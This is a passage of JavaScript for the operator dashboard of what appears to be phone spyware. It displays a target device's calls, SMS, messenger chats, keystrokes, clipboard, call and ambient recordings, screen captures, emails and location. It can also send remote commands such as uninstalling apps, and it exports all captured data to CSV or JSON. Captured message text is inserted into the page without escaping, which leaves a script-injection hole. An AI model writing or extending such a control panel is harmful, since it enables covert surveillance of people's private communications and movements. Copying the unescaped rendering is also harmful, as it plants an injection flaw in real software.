        showAlert(`⚠️ Low battery: ${location.battery_level}%`, 'warning');
    }

    // Geofence alerts
    geofences.forEach(geofence => {
        const distance = calculateDistance(
            location.latitude, location.longitude,
            geofence.latitude, geofence.longitude
        );
        if (distance <= geofence.radius) {
            showAlert(`📍 Device entered geofence: ${geofence.name}`, 'info');
        }
    });

    // Anomaly Detection: Late night activity (1 AM - 5 AM)
    const hour = new Date(location.recorded_at).getHours();
    if (hour >= 1 && hour <= 5) {
        addRiskAlertLocally('Unusual Activity', 'Device active during late night hours', 'system');
    }
}

function addRiskAlertLocally(type, desc, source) {
    const timestamp = new Date().toISOString();
    const alert = {
        id: Date.now(),
        alert_type: type,
        description: desc,
        source: source,
        recorded_at: timestamp
    };
    allData.risk_alerts.unshift(alert);
    updateRisksTable();
    showAlert(`🚨 ANOMALY: ${desc}`, 'error');
}

function calculateDistance(lat1, lon1, lat2, lon2) {
    const R = 6371000;
    const dLat = (lat2 - lat1) * Math.PI / 180;
    const dLon = (lon2 - lon1) * Math.PI / 180;
    const a = Math.sin(dLat/2) * Math.sin(dLat/2) +
              Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) *
              Math.sin(dLon/2) * Math.sin(dLon/2);
    const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
    return R * c;
}

async function sendRemoteCommand(command, payload = null) {
    try {
        if (!allData.devices || allData.devices.length === 0) {
            showAlert('⚠️ No devices connected!', 'warning');
            return;
        }

        const deviceId = allData.devices[0].id;
        const insertObj = {
            device_id: deviceId,
            command: command,
            status: 'pending',
            created_at: new Date().toISOString()
        };
        if (payload) {
            insertObj.payload = payload;
        }
        const { error } = await sbClient.from('commands').insert(insertObj);

        if (error) {
            showAlert('❌ Error sending command: ' + error.message, 'error');
            return;
        }

        showAlert(`✅ Command "${command}" sent successfully!`, 'success');
    } catch (e) {
        console.error('Send command error:', e);
        showAlert('❌ Error sending command!', 'error');
    }
}

function addGeofence() {
    const nameInput = document.getElementById('geofence-name');
    const radiusInput = document.getElementById('geofence-radius');
    const name = nameInput.value.trim();
    const radius = parseFloat(radiusInput.value);

    if (!name || isNaN(radius)) {
        showAlert('Please enter a valid name and radius', 'warning');
        return;
    }

    const center = map.getCenter();
    const geofence = {
        id: Date.now(),
        name,
        latitude: center.lat,
        longitude: center.lng,
        radius: radius
    };

    geofences.push(geofence);
    renderGeofences();
    renderGeofenceOnMap(geofence);

    nameInput.value = '';
    radiusInput.value = '100';
}

function deleteGeofence(id) {
    geofences = geofences.filter(g => g.id !== id);
    renderGeofences();
    updateMap();
}

function renderGeofences() {
    const container = document.getElementById('geofences-list');
    container.innerHTML = geofences.map(g => `
        <div class="geofence-item">
            <span>${g.name} (${g.radius}m)</span>
            <button class="delete-btn" onclick="deleteGeofence(${g.id})">Delete</button>
        </div>
    `).join('');
}

function renderGeofenceOnMap(geofence) {
    const circle = L.circle([geofence.latitude, geofence.longitude], {
        color: '#ef4444',
        fillColor: '#ef4444',
        fillOpacity: 0.2,
        radius: geofence.radius
    }).addTo(map);
    circle.bindPopup(`Geofence: ${geofence.name}`);
    geofenceCircles.push(circle);
}

async function updateDashboard() {
    await fetchData();
    updateCurrentPage();
}

function updateCurrentPage() {
    switch (currentPage) {
        case 'dashboard':
            updateStats();
            updateCharts();
            break;
        case 'map':
            updateMap();
            renderGeofences();
            break;
        case 'calls':
            updateCallsTable();
            break;
        case 'sms':
            updateSmsTable();
            break;
        case 'messengers':
            updateMessengersTable();
            break;
        case 'web':
            updateWebTable();
            break;
        case 'apps':
            updateAppsTable();
            break;
        case 'photos':
            updatePhotosGrid();
            break;
        case 'screenshots':
            updateScreenshotsGrid();
            break;
        case 'keystrokes':
            updateKeystrokesTable();
            break;
        case 'clipboard':
            updateClipboardTable();
            break;
        case 'contacts':
            updateContactsTable();
            break;
        case 'call-recordings':
            updateCallRecordingsTable();
            break;
        case 'emails':
            updateEmailsTable();
            break;
        case 'ambient':
            updateAmbientTable();
            break;
        case 'screen-record':
            updateScreenRecordTable();
            break;
        case 'risks':
            updateRisksTable();
            break;
        case 'device':
            updateDeviceInfo();
            break;
        case 'network':
            updateNetworkTable();
            break;
        case 'sim':
            updateSimTable();
            break;
        case 'app-context':
            updateAppContextTable();
            break;
        case 'installed-apps':
            updateInstalledAppsTable();
            break;
        case 'timeline':
            updateGlobalTimeline();
            break;
    }
}

function updateGlobalTimeline() {
    const container = document.getElementById("global-behavior-timeline");
    const timelineData = [];

    // Add Call Logs
    allData.call_logs.forEach(c => timelineData.push({
        type: '📞 Call',
        title: `${c.call_type === 'incoming' ? 'Incoming Call' : 'Outgoing Call'}`,
        body: `Number: ${c.phone_number} | Duration: ${formatDuration(c.duration_seconds)}`,
        time: c.call_timestamp || c.recorded_at,
        icon: '📞'
    }));

    // Add SMS
    allData.sms.forEach(s => timelineData.push({
        type: '💬 SMS',
        title: `${s.message_type === 'received' ? 'Received SMS' : 'Sent SMS'}`,
        body: `Number: ${s.phone_number} | Message: ${s.content}`,
        time: s.sms_timestamp || s.recorded_at,
        icon: '💬'
    }));

    // Add Messenger Messages
    allData.messenger_messages.forEach(m => timelineData.push({
        type: '📲 Chat',
        title: `${m.messenger_type.toUpperCase()} Message`,
        body: `From: ${m.contact_name} | Text: ${m.content}`,
        time: m.message_timestamp || m.recorded_at,
        icon: '📲'
    }));

    // Add Locations
    allData.locations.slice(0, 50).forEach(l => timelineData.push({
        type: '📍 Location',
        title: 'Device Movement',
        body: `Lat: ${l.latitude.toFixed(4)}, Lng: ${l.longitude.toFixed(4)} | Battery: ${l.battery_level}%`,
        time: l.recorded_at,
        icon: '📍'
    }));

    // Add App Usage
    allData.app_usage.forEach(a => timelineData.push({
        type: '🚀 App Opened',
        title: a.app_name,
        body: `Package: ${a.package_name} | Usage: ${formatDuration(a.usage_time_seconds)}`,
        time: a.last_used_at || a.recorded_at,
        icon: '🚀'
    }));

    // Sort by time descending
    timelineData.sort((a, b) => new Date(b.time) - new Date(a.time));

    if (timelineData.length === 0) {
        container.innerHTML = '<p style="text-align:center; padding:40px; color:#64748b;">No behavior data to display yet.</p>';
        return;
    }

    container.innerHTML = timelineData.map(item => `
        <div class="timeline-item">
            <div class="timeline-icon">${item.icon}</div>
            <div class="timeline-content">
                <div class="timeline-header">
                    <span class="timeline-app-name">${item.title}</span>
                    <span class="timeline-time">${new Date(item.time).toLocaleString()}</span>
                </div>
                <div class="timeline-body">
                    <small style="color:#64748b; font-weight:600; text-transform:uppercase; margin-bottom:4px; display:block;">${item.type}</small>
                    ${item.body}
                </div>
            </div>
        </div>
    `).join('');
}

function updateInstalledAppsTable() {
    let apps = filterDataByDate(allData.installed_apps || []);
    const tbody = document.getElementById("installed-apps-table");
    if (apps.length === 0) {
        tbody.innerHTML = '<tr><td colspan="4" style="text-align:center; padding:40px; color:#64748b;">No apps listed yet. Send "Sync Data" to refresh.</td></tr>';
        return;
    }
    tbody.innerHTML = apps.map(app => `
        <tr>
            <td><strong>${app.app_name}</strong></td>
            <td>${app.package_name}</td>
            <td>${app.version_name || "-"}</td>
            <td><button onclick="sendRemoteCommand('uninstall_app', '${app.package_name}')" style="background:var(--color-danger); color:white; border:none; padding:6px 12px; border-radius:6px; cursor:pointer;">Uninstall</button></td>
        </tr>
    `).join('');
}

function updateStats() {
    const locations = filterDataByDate(allData.locations);
    const calls = filterDataByDate(allData.call_logs);
    const sms = filterDataByDate(allData.sms);

    document.getElementById("stat-locations").textContent = locations.length;
    document.getElementById("stat-calls").textContent = calls.length;
    document.getElementById("stat-sms").textContent = sms.length;

    const latestLocation = locations[0];
    document.getElementById("stat-battery").textContent = latestLocation ? `${latestLocation.battery_level}%` : "-";

    updateRecentActivity();
}

function updateRecentActivity() {
    const container = document.getElementById("recent-activity");
    const activities = [];

    allData.call_logs.slice(0, 3).forEach(c => activities.push({ type: '📞 Call', text: `${c.call_type} from ${c.phone_number}`, time: c.call_timestamp || c.recorded_at }));
    allData.sms.slice(0, 3).forEach(s => activities.push({ type: '💬 SMS', text: `${s.message_type}: ${s.content.substring(0, 30)}...`, time: s.sms_timestamp || s.recorded_at }));
    allData.locations.slice(0, 3).forEach(l => activities.push({ type: '📍 Location', text: `Device at ${l.latitude.toFixed(4)}, ${l.longitude.toFixed(4)}`, time: l.recorded_at }));
    allData.risk_alerts.slice(0, 3).forEach(a => activities.push({ type: '⚠️ Alert', text: a.description, time: a.recorded_at }));

    activities.sort((a, b) => new Date(b.time) - new Date(a.time));

    if (activities.length === 0) {
        container.innerHTML = '<p style="padding: 20px; color: #64748b; text-align: center;">No recent activity</p>';
        return;
    }

    container.innerHTML = activities.slice(0, 8).map(act => `
        <div style="padding: 12px; border-bottom: 1px solid #f1f5f9; display: flex; justify-content: space-between; align-items: center;">
            <div>
                <strong style="color: var(--color-primary);">${act.type}</strong>
                <p style="margin: 4px 0 0 0; font-size: 14px;">${act.text}</p>
            </div>
            <span style="font-size: 12px; color: #94a3b8;">${new Date(act.time).toLocaleTimeString()}</span>
        </div>
    `).join('');
}

async function deleteAlert(id) {
    const { error } = await sbClient.from('risk_alerts').delete().eq('id', id);
    if (!error) {
        allData.risk_alerts = allData.risk_alerts.filter(a => a.id !== id);
        updateRisksTable();
        showAlert('Alert cleared', 'success');
    }
}

function updateRisksTable() {
    let risks = filterDataByDate(allData.risk_alerts);
    risks = searchData(risks, ['alert_type', 'description', 'source', 'content']);

    const tbody = document.getElementById("risks-table");
    if (risks.length === 0) {
        tbody.innerHTML = '<tr><td colspan="6" style="text-align:center; padding:40px; color:#64748b;">No risk alerts yet</td></tr>';
        return;
    }
    tbody.innerHTML = risks.map(alert => `
        <tr>
            <td><span style="padding:4px 8px; border-radius:6px; font-size:12px; background:${alert.alert_type === 'sensitive_word' ? '#fef3c7' : '#fee2e2'}; color:${alert.alert_type === 'sensitive_word' ? '#d97706' : '#ef4444'};">${alert.alert_type}</span></td>
            <td>${alert.description}</td>
            <td>${alert.source}</td>
            <td style="max-width:300px; overflow:hidden; text-overflow:ellipsis;">${alert.content}</td>
            <td>${new Date(alert.recorded_at).toLocaleString()}</td>
            <td><button onclick="deleteAlert('${alert.id}')" style="background:none; border:none; color:var(--color-danger); cursor:pointer;">🗑️ Clear</button></td>
        </tr>
    `).join('');
}

function updateDeviceInfo() {
    const container = document.getElementById("device-info-card");
    const info = allData.device_info[0];

    if (!info) {
        container.innerHTML = '<div style="text-align:center; padding:40px; color:#64748b;">No device info yet</div>';
        return;
    }

    container.innerHTML = `
        <div class="info-grid">
            <div class="info-item">
                <h4>Device Model</h4>
                <p>${info.model || "-"}</p>
            </div>
            <div class="info-item">
                <h4>Android Version</h4>
                <p>${info.android_version || "-"}</p>
            </div>
            <div class="info-item">
                <h4>RAM Available</h4>
                <p>${formatBytes(info.ram_available)}</p>
            </div>
            <div class="info-item">
                <h4>RAM Total</h4>
                <p>${formatBytes(info.ram_total)}</p>
            </div>
            <div class="info-item">
                <h4>Storage Available</h4>
                <p>${formatBytes(info.storage_available)}</p>
            </div>
            <div class="info-item">
                <h4>Storage Total</h4>
                <p>${formatBytes(info.storage_total)}</p>
            </div>
            <div class="info-item">
                <h4>Last Updated</h4>
                <p>${new Date(info.recorded_at).toLocaleString()}</p>
            </div>
        </div>
    `;
}

function updateNetworkTable() {
    let networkInfo = filterDataByDate(allData.network_info);
    const tbody = document.getElementById("network-table");
    if (networkInfo.length === 0) {
        tbody.innerHTML = '<tr><td colspan="6" style="text-align:center; padding:40px; color:#64748b;">No network info yet</td></tr>';
        return;
    }
    tbody.innerHTML = networkInfo.map(info => `
        <tr>
            <td>${info.wifi_ssid || "-"}</td>
            <td>${info.network_type || "-"}</td>
            <td>${info.signal_strength != null ? info.signal_strength + "%" : "-"}</td>
            <td>${info.cell_id || "-"}/${info.location_area_code || "-"}</td>
            <td>${info.mobile_country_code || "-"}/${info.mobile_network_code || "-"}</td>
            <td>${new Date(info.recorded_at).toLocaleString()}</td>
        </tr>
    `).join('');
}

function updateSimTable() {
    let simChanges = filterDataByDate(allData.sim_changes);
    const tbody = document.getElementById("sim-table");
    if (simChanges.length === 0) {
        tbody.innerHTML = '<tr><td colspan="3" style="text-align:center; padding:40px; color:#64748b;">No SIM changes detected</td></tr>';
        return;
    }
    tbody.innerHTML = simChanges.map(sim => `
        <tr>
            <td>${sim.old_imsi || "-"}</td>
            <td>${sim.new_imsi || "-"}</td>
            <td>${new Date(sim.recorded_at).toLocaleString()}</td>
        </tr>
    `).join('');
}

function updateAppContextTable() {
    let contexts = filterDataByDate(allData.app_screen_context || []);
    contexts = searchData(contexts, ['app_name', 'app_package', 'screen_text']);
    const container = document.getElementById("app-context-timeline");

    if (contexts.length === 0) {
        container.innerHTML = '<p style="text-align:center; padding:40px; color:#64748b;">No app screen context recorded yet</p>';
        return;
    }

    container.innerHTML = contexts.map(ctx => `
        <div class="timeline-item">
            <div class="timeline-icon">📱</div>
            <div class="timeline-content">
                <div class="timeline-header">
                    <span class="timeline-app-name">${ctx.app_name}</span>
                    <span class="timeline-time">${new Date(ctx.recorded_at).toLocaleString()}</span>
                </div>
                <div class="timeline-body">
                    ${ctx.screen_text}
                </div>
            </div>
        </div>
    `).join('');
}

function updateCharts() {
    const apps = filterDataByDate(allData.app_usage);
    const appUsageMap = {};
    apps.forEach(app => {
        const name = app.app_name || app.package_name;
        appUsageMap[name] = (appUsageMap[name] || 0) + app.usage_time_seconds;
    });

    const sortedApps = Object.entries(appUsageMap).sort((a, b) => b[1] - a[1]).slice(0, 6);
    appsChart.data.labels = sortedApps.map(([name]) => name);
    appsChart.data.datasets[0].data = sortedApps.map(([, time]) => Math.round(time / 60));
    appsChart.update();
}

function exportToCSV() {
    let csvContent = '';
    const tablesToExport = ['call_logs', 'sms', 'messenger_messages', 'web_history', 'app_usage', 'locations', 'clipboard', 'network_info'];

    tablesToExport.forEach(table => {
        const data = filterDataByDate(allData[table]);
        if (data.length > 0) {
            csvContent += `--- ${table} ---\n`;
            const headers = Object.keys(data[0]);
            csvContent += headers.join(',') + '\n';
            data.forEach(row => {
                const values = headers.map(header => {
                    const val = row[header];
                    if (typeof val === 'string' && (val.includes(',') || val.includes('"'))) {
                        return `"${val.replace(/"/g, '""')}"`;
                    }
                    return val;
                });
                csvContent += values.join(',') + '\n';
            });
            csvContent += '\n';
        }
    });

    const blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' });
    const link = document.createElement('a');
    link.href = URL.createObjectURL(blob);
    link.download = `device-monitor-export-${new Date().toISOString().split('T')[0]}.csv`;
    link.click();
}

function exportToJSON() {
    const exportData = {};
    const tablesToExport = ['call_logs', 'sms', 'messenger_messages', 'web_history', 'app_usage', 'locations', 'clipboard', 'network_info', 'device_info', 'sim_changes'];

    tablesToExport.forEach(table => {
        exportData[table] = filterDataByDate(allData[table]);
    });

    const blob = new Blob([JSON.stringify(exportData, null, 2)], { type: 'application/json' });
    const link = document.createElement('a');
    link.href = URL.createObjectURL(blob);
    link.download = `device-monitor-export-${new Date().toISOString().split('T')[0]}.json`;
    link.click();
}
